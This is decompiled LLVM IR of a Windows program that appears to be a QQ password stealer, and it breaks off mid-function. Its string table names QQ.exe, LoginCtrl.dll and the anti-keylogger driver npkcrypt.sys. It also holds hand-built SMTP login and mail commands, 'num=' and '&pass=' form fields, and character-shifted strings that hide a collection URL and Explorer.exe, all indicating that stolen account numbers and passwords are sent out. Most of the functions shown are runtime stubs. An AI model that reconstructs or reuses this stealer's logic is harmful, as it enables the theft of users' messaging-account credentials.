source_filename = "test"
target datalayout = "e-p:32:32-f64:32:64-f80:32-n8:16:32-S128"

%_EXCEPTION_RECORD = type { i32, i32, %_EXCEPTION_RECORD*, i32*, i32, [1 x i32] }
%_EXCEPTION_POINTERS = type { %_EXCEPTION_RECORD*, %_CONTEXT* }
%_CONTEXT = type { i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i16, i16, i16, i16, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, [26 x %_M128A], i32, i32, i32, i32, i32, i32 }
%_M128A = type { i32, i64 }
%_OVERLAPPED = type { i32, i32, i32, i32* }
%_STARTUPINFOA = type { i32, i8*, i8*, i8*, i32, i32, i32, i32, i32, i32, i32, i32, i16, i16, i8*, i32*, i32*, i32* }
%_LARGE_INTEGER = type { i64 }
%_RTL_CRITICAL_SECTION = type { %_RTL_CRITICAL_SECTION_DEBUG*, i32, i32, i32*, i32*, i32 }
%_RTL_CRITICAL_SECTION_DEBUG = type { i16, i16, %_RTL_CRITICAL_SECTION*, %_LIST_ENTRY, i32, i32, i32, i16, i16 }
%_LIST_ENTRY = type { %_LIST_ENTRY*, %_LIST_ENTRY* }
%_SECURITY_ATTRIBUTES = type { i32, i32*, i1 }
%tagMSG = type { i32*, i32, i32, i32, i32, %tagPOINT }
%tagPOINT = type { i32, i32 }
%sockaddr = type { i16, [14 x i8] }
%in_addr = type { i32 }
%hostent = type { i8*, i8**, i16, i16, i8** }
%WSAData = type { i16, i16, i16, i16, i8*, [1 x i8], [1 x i8] }

@global_var_408000 = local_unnamed_addr global i32 0
@global_var_408094 = local_unnamed_addr global i32 0
@global_var_409658 = local_unnamed_addr global i32 0
@global_var_409660 = local_unnamed_addr global i32 0
@global_var_409664 = local_unnamed_addr global i32 0
@global_var_409678 = local_unnamed_addr global i32 0
@global_var_409674 = local_unnamed_addr global i32 0
@global_var_409670 = local_unnamed_addr global i32 0
@global_var_40966c = global i32 0
@global_var_409668 = global i32 0
@global_var_4080bc = global i32 4212308
@global_var_40967c = local_unnamed_addr global i32 0
@global_var_409680 = local_unnamed_addr global i32 0
@global_var_409684 = local_unnamed_addr global i32 0
@global_var_409688 = local_unnamed_addr global i32 0
@global_var_40968c = local_unnamed_addr global i32 0
@global_var_409690 = local_unnamed_addr global i32 0
@global_var_409694 = local_unnamed_addr global i32 0
@global_var_4080f8 = local_unnamed_addr global i32 0
@global_var_4080fc = local_unnamed_addr global i32 0
@global_var_404db0 = local_unnamed_addr constant [33 x i8] c"http://jump.qq.com/clienturl_157\00"
@global_var_404dd4 = constant [33 x i8] c"http://jump.qq.com/clienturl_156\00"
@global_var_408100 = local_unnamed_addr global i32 0
@global_var_404e68 = constant [11 x i8] c"user32.dll\00"
@global_var_404e74 = constant [11 x i8] c"LoadImageA\00"
@global_var_404e80 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.DLL\00"
@global_var_404a20 = local_unnamed_addr constant i32 4213356
@global_var_404a6c = local_unnamed_addr constant i32 1867011080
@global_var_404e90 = constant [12 x i8] c"LoadStringA\00"
@global_var_404e9c = local_unnamed_addr constant [10 x i8] c"MFC42.DLL\00"
@global_var_404ea8 = constant [12 x i8] c"shell32.dll\00"
@global_var_404eb4 = constant [14 x i8] c"ShellExecuteA\00"
@global_var_404ec4 = local_unnamed_addr constant [16 x i8] c"QQHELPERDLL.DLL\00"
@global_var_4080f9 = local_unnamed_addr global i32 0
@global_var_40969c = local_unnamed_addr global i32 0
@global_var_409698 = local_unnamed_addr global i32 0
@global_var_4096a0 = local_unnamed_addr global i32 0
@global_var_4096a4 = local_unnamed_addr global i32 0
@global_var_4096a8 = local_unnamed_addr global i32 0
@global_var_405188 = local_unnamed_addr constant i32 43
@global_var_4051a0 = constant i32 37
@global_var_405228 = local_unnamed_addr constant i32 63
@global_var_4096ac = local_unnamed_addr global i32 0
@global_var_4052ec = local_unnamed_addr constant [3 x i8] c"mz\00"
@global_var_4052f0 = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_408104 = global i32 1
@global_var_40530c = constant [10 x i8] c"First Run\00"
@global_var_4053c8 = constant [27 x i8] c"Software\5Cmz\5CQQBeta3 Hooker\00"
@global_var_4053e4 = constant [10 x i8] c"First Run\00"
@global_var_408138 = external local_unnamed_addr global i32
@global_var_4080c0 = local_unnamed_addr global i32 0
@global_var_4080e8 = global i32 4213024
@global_var_4080f4 = local_unnamed_addr global i32 66
@global_var_4080cc = local_unnamed_addr global i32 4212320
@global_var_4080c8 = local_unnamed_addr global i32 0
@global_var_4080e4 = global i32 4212956
@global_var_4080dc = local_unnamed_addr global i32 4212820
@global_var_4080f0 = global i32 4230401
@global_var_405490 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_4054a0 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_4096b0 = local_unnamed_addr global i32 0
@global_var_40813c = external local_unnamed_addr global i32
@global_var_405764 = constant [9 x i8] c"ComboBox\00"
@global_var_408140 = external local_unnamed_addr global i32
@global_var_40812c = external local_unnamed_addr global i32
@global_var_4080c4 = local_unnamed_addr global i32 0
@global_var_4080d8 = global i32 4212752
@global_var_4096b8 = local_unnamed_addr global i32 0
@global_var_4096bc = local_unnamed_addr global i32 0
@global_var_4096b4 = local_unnamed_addr global i32 0
@global_var_408108 = local_unnamed_addr global i32 4217012
@B64EncodeTable_at_4058b4 = constant [64 x i8] c"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
@global_var_405f8c = constant [6 x i8] c"HELO \00"
@global_var_405f9c = constant [3 x i8] c"\0D\0A\00"
@global_var_405fa8 = local_unnamed_addr constant [13 x i8] c"AUTH LOGIN\0D\0A\00"
@global_var_405fc0 = constant [13 x i8] c"MAIL FROM: <\00"
@global_var_405fd8 = constant i32 62
@global_var_405fe4 = constant [11 x i8] c"RCPT TO: <\00"
@global_var_405ff8 = local_unnamed_addr constant [7 x i8] c"DATA\0D\0A\00"
@global_var_406008 = constant [8 x i8] c"From: <\00"
@global_var_406018 = constant [6 x i8] c"To: <\00"
@global_var_406028 = constant [10 x i8] c"Subject: \00"
@global_var_40603c = constant i32 46
@global_var_4096c4 = local_unnamed_addr global i32 0
@global_var_406048 = local_unnamed_addr constant [7 x i8] c"QUIT\0D\0A\00"
@global_var_4096c0 = local_unnamed_addr global i32 0
@global_var_406092 = local_unnamed_addr constant i32 763609949
@global_var_4061b4 = constant [7 x i8] c"#32770\00"
@global_var_4061c4 = local_unnamed_addr constant [7 x i8] c"Button\00"
@global_var_4096c8 = local_unnamed_addr global i32 0
@global_var_4096d0 = local_unnamed_addr global i32 0
@global_var_406210 = local_unnamed_addr constant i32 4219412
@global_var_406214 = local_unnamed_addr constant i32 841875985
@global_var_4096cc = local_unnamed_addr global i32 0
@global_var_40810c = local_unnamed_addr global i32 4219704
@global_var_408128 = local_unnamed_addr global i32* @global_var_4080bc
@global_var_4096d4 = local_unnamed_addr global i32 0
@global_var_408154 = external local_unnamed_addr global i32
@global_var_406534 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408110 = local_unnamed_addr global i32 0
@global_var_408148 = external local_unnamed_addr global i32
@global_var_408114 = local_unnamed_addr global i32 0
@global_var_4096d8 = local_unnamed_addr global i32 0
@global_var_4080ec = global i32 4213092
@global_var_408124 = local_unnamed_addr global i32* @global_var_4080ec
@global_var_40684c = constant [6 x i8] c"Down(\00"
@global_var_40685c = constant i32 41
@global_var_406868 = local_unnamed_addr constant [4 x i8] c"c:\5C\00"
@global_var_40686c = constant [5 x i8] c"Open\00"
@global_var_4096dc = global i32 0
@global_var_406b30 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_4080e0 = local_unnamed_addr global i32 4212888
@global_var_406b3c = constant i32 47
@global_var_406b7c = local_unnamed_addr constant i32 64
@global_var_408158 = local_unnamed_addr global i32* @global_var_4080e4
@global_var_408144 = local_unnamed_addr global i32* @global_var_4080e8
@global_var_406b88 = constant [5 x i8] c"num=\00"
@global_var_406b98 = constant [7 x i8] c"&pass=\00"
@global_var_408134 = local_unnamed_addr global i32* @global_var_4080d8
@global_var_406ba8 = local_unnamed_addr constant [35 x i8] c"iuuq;00uftu=43992=dpn0nzrr0ofx=btq\00"
@global_var_406c80 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406c90 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_406da0 = local_unnamed_addr constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_406db0 = local_unnamed_addr constant [8 x i8] c"ListBox\00"
@global_var_408130 = local_unnamed_addr global i32* @global_var_409668
@global_var_406db8 = local_unnamed_addr constant [13 x i8] c"xr, wo ai ni\00"
@global_var_4096e0 = local_unnamed_addr global i32 0
@global_var_4096e8 = local_unnamed_addr global i32 0
@global_var_408150 = local_unnamed_addr global i32* @global_var_40966c
@global_var_40702c = local_unnamed_addr constant [11 x i8] c"joipor.obj\00"
@global_var_407040 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_40704c = local_unnamed_addr constant i32 47
@global_var_406e38 = local_unnamed_addr constant i32 4222524
@global_var_406e3c = local_unnamed_addr constant i32 841875985
@global_var_40716c = local_unnamed_addr constant [11 x i8] c"joipor.obj\00"
@global_var_407180 = constant i32 47
@global_var_40718c = constant [3 x i8] c"\0D\0A\00"
@global_var_4096e4 = local_unnamed_addr global i32 0
@global_var_407764 = local_unnamed_addr constant [7 x i8] c"#32770\00"
@global_var_407810 = local_unnamed_addr constant [5 x i8] c"Edit\00"
@global_var_407998 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_408160 = local_unnamed_addr global i32* @global_var_4080f0
@global_var_4079a4 = local_unnamed_addr constant [3 x i8] c"\0D\0A\00"
@global_var_408120 = local_unnamed_addr global i32* @global_var_4096dc
@global_var_4096ec = local_unnamed_addr global i32 0
@global_var_407a98 = local_unnamed_addr constant i32 28
@global_var_409800 = local_unnamed_addr global i32 0
@global_var_409804 = local_unnamed_addr global i32 0
@global_var_4097fc = local_unnamed_addr global i32 0
@global_var_407e38 = local_unnamed_addr constant [7 x i8] c"QQ.exe\00"
@global_var_4097f8 = local_unnamed_addr global i32 0
@global_var_407e48 = local_unnamed_addr constant [13 x i8] c"npkcrypt.sys\00"
@global_var_407e60 = local_unnamed_addr constant [14 x i8] c"LoginCtrl.dll\00"
@global_var_408118 = local_unnamed_addr global i32 0
@global_var_407e78 = local_unnamed_addr constant [13 x i8] c"Fyqmpsfs=fyf\00"
@global_var_407e88 = constant [16 x i8] c"xr, wo xiang ni\00"
@global_var_407e98 = constant [8 x i8] c"ListBox\00"
@global_var_409808 = global i32 0
@global_var_407ea8 = local_unnamed_addr constant [3 x i8] c"rr\00"
@global_var_409654 = local_unnamed_addr global i32 0
@0 = external global i32
@global_var_4095ac = local_unnamed_addr global i8 0
@1 = internal constant [12 x i8] c"aixiaran\10H@\00"
@global_var_4080d0 = global i8* getelementptr inbounds ([12 x i8], [12 x i8]* @1, i32 0, i32 0)
@global_var_409650 = local_unnamed_addr global i32 (i32, i32, i32)* null
@global_var_4096f0 = external global i8*

declare i32 @unknown_536c() local_unnamed_addr

declare i32 @unknown_5444() local_unnamed_addr

define i32* @GetStdHandle.19(i32 %nStdHandle) local_unnamed_addr {
dec_label_pc_401060:
  %0 = call i32* @GetStdHandle(i32 %nStdHandle), !insn.addr !0
  ret i32* %0, !insn.addr !0
}

define void @RaiseException.40(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments) local_unnamed_addr {
dec_label_pc_401068:
  call void @RaiseException(i32 %dwExceptionCode, i32 %dwExceptionFlags, i32 %nNumberOfArguments, i32* %lpArguments), !insn.addr !1
  ret void, !insn.addr !1
}

define void @RtlUnwind.41(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue) local_unnamed_addr {
dec_label_pc_401070:
  call void @RtlUnwind(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue), !insn.addr !2
  ret void, !insn.addr !2
}

define i32 @UnhandledExceptionFilter.33(%_EXCEPTION_POINTERS* %ExceptionInfo) local_unnamed_addr {
dec_label_pc_401078:
  %0 = call i32 @UnhandledExceptionFilter(%_EXCEPTION_POINTERS* %ExceptionInfo), !insn.addr !3
  ret i32 %0, !insn.addr !3
}

define i1 @WriteFile.20(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped) local_unnamed_addr {
dec_label_pc_401080:
  %0 = call i1 @WriteFile(i32* %hFile, i32* %lpBuffer, i32 %nNumberOfBytesToWrite, i32* %lpNumberOfBytesWritten, %_OVERLAPPED* %lpOverlapped), !insn.addr !4
  ret i1 %0, !insn.addr !4
}

define void @ExitProcess.18(i32 %uExitCode) local_unnamed_addr {
dec_label_pc_401088:
  call void @ExitProcess(i32 %uExitCode), !insn.addr !5
  ret void, !insn.addr !5
}

define i32 @MessageBox(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType) local_unnamed_addr {
dec_label_pc_401090:
  %0 = call i32 @MessageBoxA(i32* %hWnd, i8* %lpText, i8* %lpCaption, i32 %uType), !insn.addr !6
  ret i32 %0, !insn.addr !6
}

define i1 @FreeLibrary.17(i32* %hLibModule) local_unnamed_addr {
dec_label_pc_401098:
  %0 = call i1 @FreeLibrary(i32* %hLibModule), !insn.addr !7
  ret i1 %0, !insn.addr !7
}

define i8* @GetCommandLine() local_unnamed_addr {
dec_label_pc_4010a0:
  %0 = call i8* @GetCommandLineA(), !insn.addr !8
  ret i8* %0, !insn.addr !8
}

define i32 @GetLocaleInfo(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData) local_unnamed_addr {
dec_label_pc_4010a8:
  %0 = call i32 @GetLocaleInfoA(i32 %Locale, i32 %LCType, i8* %lpLCData, i32 %cchData), !insn.addr !9
  ret i32 %0, !insn.addr !9
}

define void @GetStartupInfo(%_STARTUPINFOA* %lpStartupInfo) local_unnamed_addr {
dec_label_pc_4010b0:
  call void @GetStartupInfoA(%_STARTUPINFOA* %lpStartupInfo), !insn.addr !10
  ret void, !insn.addr !10
}

define i32 @GetThreadLocale.35() local_unnamed_addr {
dec_label_pc_4010b8:
  %0 = call i32 @GetThreadLocale(), !insn.addr !11
  ret i32 %0, !insn.addr !11
}

define i32 @RegCloseKey.32(i32* %hKey) local_unnamed_addr {
dec_label_pc_4010c0:
  %0 = call i32 @RegCloseKey(i32* %hKey), !insn.addr !12
  ret i32 %0, !insn.addr !12
}

define i32 @RegOpenKeyEx(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult) local_unnamed_addr {
dec_label_pc_4010c8:
  %0 = call i32 @RegOpenKeyExA(i32* %hKey, i8* %lpSubKey, i32 %ulOptions, i32 %samDesired, i32** %phkResult), !insn.addr !13
  ret i32 %0, !insn.addr !13
}

define i32 @RegQueryValueEx(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData) local_unnamed_addr {
dec_label_pc_4010d0:
  %0 = call i32 @RegQueryValueExA(i32* %hKey, i8* %lpValueName, i32* %lpReserved, i32* %lpType, i8* %lpData, i32* %lpcbData), !insn.addr !14
  ret i32 %0, !insn.addr !14
}

define i32 @SysReAllocStringLen.25(i16** %pbstr, i16* %psz, i32 %len) local_unnamed_addr {
dec_label_pc_4010d8:
  %0 = call i32 @SysReAllocStringLen(i16** %pbstr, i16* %psz, i32 %len), !insn.addr !15
  ret i32 %0, !insn.addr !15
}

define void @SysFreeString.26(i16* %bstrString) local_unnamed_addr {
dec_label_pc_4010e0:
  call void @SysFreeString(i16* %bstrString), !insn.addr !16
  ret void, !insn.addr !16
}

define i32 @GetCurrentThreadId.36() local_unnamed_addr {
dec_label_pc_4010e8:
  %0 = call i32 @GetCurrentThreadId(), !insn.addr !17
  ret i32 %0, !insn.addr !17
}

define i32 @GetVersion.34() local_unnamed_addr {
dec_label_pc_4010f0:
  %0 = call i32 @GetVersion(), !insn.addr !18
  ret i32 %0, !insn.addr !18
}

define i1 @QueryPerformanceCounter.29(%_LARGE_INTEGER* %lpPerformanceCount) local_unnamed_addr {
dec_label_pc_4010f8:
  %0 = call i1 @QueryPerformanceCounter(%_LARGE_INTEGER* %lpPerformanceCount), !insn.addr !19
  ret i1 %0, !insn.addr !19
}

define i32 @GetTickCount.30() local_unnamed_addr {
dec_label_pc_401100:
  %0 = call i32 @GetTickCount(), !insn.addr !20
  ret i32 %0, !insn.addr !20
}

define i32* @LocalAlloc.15(i32 %uFlags, i32 %uBytes) local_unnamed_addr {
dec_label_pc_40112c:
  %0 = call i32* @LocalAlloc(i32 %uFlags, i32 %uBytes), !insn.addr !21
  ret i32* %0, !insn.addr !21
}

define i32* @LocalFree.27(i32* %hMem) local_unnamed_addr {
dec_label_pc_401134:
  %0 = call i32* @LocalFree(i32* %hMem), !insn.addr !22
  ret i32* %0, !insn.addr !22
}

define i32* @VirtualAlloc.21(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect) local_unnamed_addr {
dec_label_pc_40113c:
  %0 = call i32* @VirtualAlloc(i32* %lpAddress, i32 %dwSize, i32 %flAllocationType, i32 %flProtect), !insn.addr !23
  ret i32* %0, !insn.addr !23
}

define i1 @VirtualFree.16(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType) local_unnamed_addr {
dec_label_pc_401144:
  %0 = call i1 @VirtualFree(i32* %lpAddress, i32 %dwSize, i32 %dwFreeType), !insn.addr !24
  ret i1 %0, !insn.addr !24
}

define void @InitializeCriticalSection.14(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40114c:
  call void @InitializeCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !25
  ret void, !insn.addr !25
}

define void @EnterCriticalSection.12(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401154:
  call void @EnterCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !26
  ret void, !insn.addr !26
}

define void @LeaveCriticalSection.13(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_40115c:
  call void @LeaveCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !27
  ret void, !insn.addr !27
}

define void @DeleteCriticalSection.28(%_RTL_CRITICAL_SECTION* %lpCriticalSection) local_unnamed_addr {
dec_label_pc_401164:
  call void @DeleteCriticalSection(%_RTL_CRITICAL_SECTION* %lpCriticalSection), !insn.addr !28
  ret void, !insn.addr !28
}

define i32 @InitAllocator.42() local_unnamed_addr {
dec_label_pc_4018ae:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !29
  ret i32 %0, !insn.addr !29
}

define i32 @function_4018b3() local_unnamed_addr {
dec_label_pc_4018b3:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !30
}

define i32 @function_4018b5(i32 %arg1) local_unnamed_addr {
dec_label_pc_4018b5:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i8, i8* @global_var_4095ac, align 1, !insn.addr !31
  %2 = zext i8 %1 to i32, !insn.addr !31
  %3 = and i32 %0, -256, !insn.addr !31
  %4 = or i32 %3, %2, !insn.addr !31
  ret i32 %4, !insn.addr !32
}

define i32 @SysGetMem.43() local_unnamed_addr {
dec_label_pc_402060:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !33
  ret i32 %0, !insn.addr !33
}

define i32 @function_402065() local_unnamed_addr {
dec_label_pc_402065:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !34
}

define i32 @function_402067(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_402067:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !35
  %2 = inttoptr i32 %1 to i32*, !insn.addr !35
  %3 = load i32, i32* %2, align 4, !insn.addr !35
  ret i32 %3, !insn.addr !36
}

define i32 @SysFreeMem.44() local_unnamed_addr {
dec_label_pc_402206:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !37
  ret i32 %0, !insn.addr !37
}

define i32 @function_40220b() local_unnamed_addr {
dec_label_pc_40220b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !38
}

define i32 @function_40220d(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_40220d:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !39
  %2 = inttoptr i32 %1 to i32*, !insn.addr !39
  %3 = load i32, i32* %2, align 4, !insn.addr !39
  ret i32 %3, !insn.addr !40
}

define i32 @SysReallocMem.45() local_unnamed_addr {
dec_label_pc_4024a5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !41
  ret i32 %0, !insn.addr !41
}

define i32 @function_4024aa() local_unnamed_addr {
dec_label_pc_4024aa:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !42
}

define i32 @function_4024ac(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_4024ac:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !43
  %2 = inttoptr i32 %1 to i32*, !insn.addr !43
  %3 = load i32, i32* %2, align 4, !insn.addr !43
  ret i32 %3, !insn.addr !44
}

define i32 @function_402553() local_unnamed_addr {
dec_label_pc_402553:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !45
}

define i32 @function_40259b(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_40259b:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !46
}

define i32 @function_4025ab() local_unnamed_addr {
dec_label_pc_4025ab:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !47
}

declare i32 @Move() local_unnamed_addr

declare i32 @"@PStrNCpy"() local_unnamed_addr

declare i32 @"@FillChar"() local_unnamed_addr

declare i32 @"@Str0Long"(i32, i32) local_unnamed_addr

define i32 @GetKeyboardType.31(i32 %nTypeFlag) local_unnamed_addr {
dec_label_pc_4028b0:
  %0 = call i32 @GetKeyboardType(i32 %nTypeFlag), !insn.addr !48
  ret i32 %0, !insn.addr !48
}

define i32 @function_402ab4() local_unnamed_addr {
dec_label_pc_402ab4:
  ret i32 -2147418113, !insn.addr !49
}

define i32 @function_402abc() local_unnamed_addr {
dec_label_pc_402abc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !50
}

define i32 @function_402ac0() local_unnamed_addr {
dec_label_pc_402ac0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !51
}

define i32 @function_402ac4() local_unnamed_addr {
dec_label_pc_402ac4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !52
}

define i32 @function_402aee() local_unnamed_addr {
dec_label_pc_402aee:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !53
}

declare i32 @"@ClassCreate"(i32, i32, i32, i32, i32) local_unnamed_addr

define i32 @"@ClassCreate.46"() local_unnamed_addr {
dec_label_pc_402b19:
  %0 = call i32 @"@HandleAnyException"(), !insn.addr !54
  ret i32 %0, !insn.addr !54
}

define i32 @function_402b1e(i32 %arg1) local_unnamed_addr {
dec_label_pc_402b1e:
  %0 = add i32 %arg1, 12, !insn.addr !55
  %1 = inttoptr i32 %0 to i32*, !insn.addr !55
  %2 = load i32, i32* %1, align 4, !insn.addr !55
  %3 = icmp eq i32 %2, 0, !insn.addr !56
  br i1 %3, label %dec_label_pc_402b37, label %dec_label_pc_402b29, !insn.addr !57

dec_label_pc_402b29:                              ; preds = %dec_label_pc_402b1e
  %4 = call i32 @"@ClassDestroy"(), !insn.addr !58
  br label %dec_label_pc_402b37, !insn.addr !58

dec_label_pc_402b37:                              ; preds = %dec_label_pc_402b29, %dec_label_pc_402b1e
  %5 = call i32 @"@RaiseAgain"(), !insn.addr !59
  ret i32 %5, !insn.addr !60
}

declare i32 @"@ClassDestroy"() local_unnamed_addr

define i32 @function_402b48() local_unnamed_addr {
dec_label_pc_402b48:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !61
}

declare i32 @"@BeforeDestruction"(i32, i32) local_unnamed_addr

declare i32 @"@HandleAnyException"() local_unnamed_addr

declare i32 @"@HandleFinally"() local_unnamed_addr

declare i32 @"@RaiseAgain"() local_unnamed_addr

define i32 @function_402e3f() local_unnamed_addr {
dec_label_pc_402e3f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !62
}

define i32 @function_402e55() local_unnamed_addr {
dec_label_pc_402e55:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !63
}

define i32 @function_402ef4(i32 %arg1) local_unnamed_addr {
dec_label_pc_402ef4:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !64
}

define i32 @function_403167() local_unnamed_addr {
dec_label_pc_403167:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !65
}

define i32 @function_4031f1() local_unnamed_addr {
dec_label_pc_4031f1:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !66
}

declare i32 @"@Halt0"() local_unnamed_addr

define i32 @function_403353(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_403353:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !67
}

define i32 @"@Halt"() local_unnamed_addr {
dec_label_pc_403358:
  %0 = call i32 @"@Halt0"(), !insn.addr !68
  unreachable, !insn.addr !68
}

define i32 @function_403362() local_unnamed_addr {
dec_label_pc_403362:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !69
}

define i32 @function_40336f() local_unnamed_addr {
dec_label_pc_40336f:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !70
}

declare i32 @"@LStrClr"() local_unnamed_addr

declare i32 @"@LStrArrayClr"() local_unnamed_addr

declare i32 @"@LStrAsg"() local_unnamed_addr

declare i32 @"@LStrFromChar"() local_unnamed_addr

declare i32 @"@LStrFromPChar"() local_unnamed_addr

define i32 @function_4034a0() local_unnamed_addr {
dec_label_pc_4034a0:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !71
}

declare i32 @"@LStrFromString"() local_unnamed_addr

define i32 @function_4034ae() local_unnamed_addr {
dec_label_pc_4034ae:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !72
}

declare i32 @"@LStrFromArray"() local_unnamed_addr

define i32 @function_4034c7() local_unnamed_addr {
dec_label_pc_4034c7:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !73
}

define i32 @function_4034c8() local_unnamed_addr {
dec_label_pc_4034c8:
  %eax.0.reg2mem = alloca i32, !insn.addr !74
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !74
  store i32 0, i32* %eax.0.reg2mem, !insn.addr !75
  br i1 %1, label %dec_label_pc_4034cf, label %dec_label_pc_4034cc, !insn.addr !75

dec_label_pc_4034cc:                              ; preds = %dec_label_pc_4034c8
  %2 = add i32 %0, -4, !insn.addr !76
  %3 = inttoptr i32 %2 to i32*, !insn.addr !76
  %4 = load i32, i32* %3, align 4, !insn.addr !76
  store i32 %4, i32* %eax.0.reg2mem, !insn.addr !76
  br label %dec_label_pc_4034cf, !insn.addr !76

dec_label_pc_4034cf:                              ; preds = %dec_label_pc_4034cc, %dec_label_pc_4034c8
  %eax.0.reload = load i32, i32* %eax.0.reg2mem
  ret i32 %eax.0.reload, !insn.addr !77
}

declare i32 @"@LStrCat"() local_unnamed_addr

declare i32 @"@LStrCat3"() local_unnamed_addr

define i32 @function_403587() local_unnamed_addr {
dec_label_pc_403587:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !78
}

declare i32 @"@LStrCatN"() local_unnamed_addr

define i32 @function_403611() local_unnamed_addr {
dec_label_pc_403611:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !79
}

declare i32 @"@LStrCmp"() local_unnamed_addr

define i32 @function_4036b8() local_unnamed_addr {
dec_label_pc_4036b8:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = icmp eq i32 %0, 0, !insn.addr !80
  br i1 %1, label %dec_label_pc_4036c6, label %dec_label_pc_4036bc, !insn.addr !81

dec_label_pc_4036bc:                              ; preds = %dec_label_pc_4036b8
  %2 = add i32 %0, -8, !insn.addr !82
  %3 = inttoptr i32 %2 to i32*, !insn.addr !82
  %4 = load i32, i32* %3, align 4, !insn.addr !82
  %5 = add i32 %4, 1, !insn.addr !83
  %6 = icmp slt i32 %5, 1, !insn.addr !84
  br i1 %6, label %dec_label_pc_4036c6, label %dec_label_pc_4036c2, !insn.addr !84

dec_label_pc_4036c2:                              ; preds = %dec_label_pc_4036bc
